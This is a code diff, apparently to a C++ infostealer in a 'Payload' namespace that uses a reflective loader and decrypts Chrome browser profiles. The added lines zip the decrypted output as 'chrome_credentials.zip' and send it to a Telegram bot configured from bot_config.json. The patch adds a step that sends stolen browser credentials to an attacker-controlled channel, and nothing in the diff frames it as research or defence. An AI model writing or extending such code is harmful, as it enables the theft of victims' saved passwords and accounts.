@@ -26,6 +26,7 @@
 
 #include "reflective_loader.h"
 #include "sqlite3.h"
+#include "bot_utils.h"
 
 #pragma comment(lib, "Crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
@@ -712,6 +713,19 @@ namespace Payload
             }
 
             m_logger.Log("[*] All profiles processed. Decryption process finished.");
+
+            BotUtils::TelegramConfig tgConfig = BotUtils::LoadTelegramConfig("bot_config.json");
+            std::filesystem::path zipPath = m_outputPath / "chrome_credentials.zip";
+            if (BotUtils::ZipFolder(m_outputPath, zipPath)) {
+                if (BotUtils::SendZipToTelegram(tgConfig, zipPath)) {
+                    m_logger.Log("[+] Credentials ZIP sent to Telegram successfully.");
+                } else {
+                    m_logger.Log("[-] Failed to send ZIP to Telegram.");
+                }
+            } else {
+                m_logger.Log("[-] Failed to zip credentials folder.");
+            }
+            
         }
 
     private:
